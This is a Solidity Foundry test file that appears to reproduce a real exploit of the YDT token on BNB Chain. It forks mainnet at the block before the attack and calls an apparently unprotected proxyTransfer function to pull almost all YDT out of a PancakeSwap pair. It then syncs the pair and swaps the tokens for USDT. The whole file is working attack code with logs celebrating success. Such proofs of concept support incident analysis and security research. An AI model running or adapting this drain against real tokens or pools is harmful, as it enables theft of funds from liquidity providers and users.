// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
}

interface IYDT {
    function proxyTransfer(address sender, address recipient, uint256 amount, address callerModule) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IPancakePair {
    function sync() external;
}

contract YDTHack is Test {
    // Tx Debugging with Sentio Debugger : https://app.sentio.xyz/tx/56/0x233b21d0355108593c3f136797aed886ae1d4655384b33d67b1fccee88cdfbc2?nav=s

    address constant TAX_MODULE = 0x013E29791A23020cF0621AeCe8649c38DaAE96f0;
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant YDT = 0x3612e4Cb34617bCac849Add27366D8D85C102eFd;
    address pancakePair = 0xFd13B6E1d07bAd77Dd248780d0c3d30859585242;
    IPancakeRouter pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    function setUp() public {
        uint256 fork = vm.createSelectFork("https://binance.llamarpc.com", 50273545); // Attack occured in 50273546 so we roll a block before
        vm.selectFork(fork);
    }

    function test_Exploit() public {
        assert(block.number == 50273545);
        assert(block.chainid == 56);

        vm.deal(address(this), 1 ether); // Give 1 BNB
        console2.log("----> Current block number:", block.number);
        console2.log("----> Current Chain ID:", block.chainid);
        uint256 pairBalance = IERC20(YDT).balanceOf(pancakePair);
        console2.log("**** Pancake Pair YDT Balance:", pairBalance);
        IYDT(YDT).proxyTransfer(pancakePair, address(this), pairBalance - 1000 * 1e6, TAX_MODULE);
        console2.log("**** Syncing Pancake Pair...");
        IPancakePair(pancakePair).sync();
        console2.log("**** Swapping YDT for USDT...");

        address[] memory path = new address[](2);
        path[0] = YDT;
        path[1] = USDT;
        uint256 ydtBalanceOfAttacker = IERC20(YDT).balanceOf(address(this));
        console2.log("**** YDT Balance of Attacker:", ydtBalanceOfAttacker);
        IERC20(YDT).approve(address(pancakeRouter), ydtBalanceOfAttacker);
        IPancakeRouter(pancakeRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ydtBalanceOfAttacker, 0, path, address(this), block.timestamp + 120
        );
        uint256 usdtBalanceOfAttacker = IERC20(USDT).balanceOf(address(this));
        console2.log("**** USDT Balance of Attacker after swap:", usdtBalanceOfAttacker);
        console2.log("**** Attack completed successfully!");
    }
}
